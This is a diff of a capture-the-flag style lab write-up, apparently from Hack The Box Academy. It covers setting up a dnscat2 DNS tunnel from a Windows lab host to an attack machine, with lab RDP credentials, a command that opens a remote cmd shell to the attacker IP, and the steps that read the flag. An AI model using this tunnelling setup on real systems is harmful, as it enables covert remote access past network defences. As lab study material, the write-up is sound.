@@ -312,31 +312,37 @@ Once inside, I navigated to the Approved Vendors folder and opened the VendorCon
 
 * **Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.**
 
-I began by connecting to the Windows host via RDP with 
-
+I first established an RDP connection to the Windows machine using xfreerdp:
+```c
 xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
+```
 
-Once connected, I opened a new bash tab on my attack host and started the dns2server 
-
+Once connected, I proceeded to set up the dnscat2 server on my attack machine. In a new terminal tab, I launched the dnscat2 server to listen for incoming DNS traffic:
+```c
 sudo ruby dnscat2.rb --dns host=10.10.14.162,port=53,domain=inlanefreight.local --no-cache
+```
+On my attack machine, I cloned the dnscat2 PowerShell client repository:
+```c
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+```
+To transfer the dnscat2 client to the compromised Windows machine, I simply copied and pasted the dnscat2.ps1 script to the Desktop of the RDP session.
 
-I opened another tab to clone the dns2client portion 
+Next, I opened PowerShell on the Windows host and navigated to the Desktop where I placed dnscat2.ps1.
 
- git clone https://github.com/lukebaggett/dnscat2-powershell.git
-
-Now I copied the dns2client to the windows host by copy and pasting it on the Desktop
-
-I proceeded to open a Powershell and importing the PS1 module 
-
+I then imported the module and established a connection to my dnscat2 server:
+```c
 > Import-Module .\dnscat2.ps1
 PS C:\Users\htb-student\Desktop\dnscat2-powershell> Start-Dnscat2 -DNSserver 10.10.14.162 -Domain inlanefreight.local -PreSharedSecret f5c900b45f2feedcf213c4edb1906de9 -Exec cmd
+```
 
-This opened a session with dnscat2 
-
-Once in the dnscat2 session I used
-
+I successfully established a session in dnscat2. I interacted with the active session:
+```c
 session -i 1
+```
+Once inside, I navigated to the target folder and displayed the flag:
+```c
 cd C:\Users\htb-student\Documents\
 type flag.txt 
-
+```
+[![Screenshot-2025-03-05-093531.png](https://i.postimg.cc/DftH8Bm1/Screenshot-2025-03-05-093531.png)](https://postimg.cc/MXmdL07G)
 
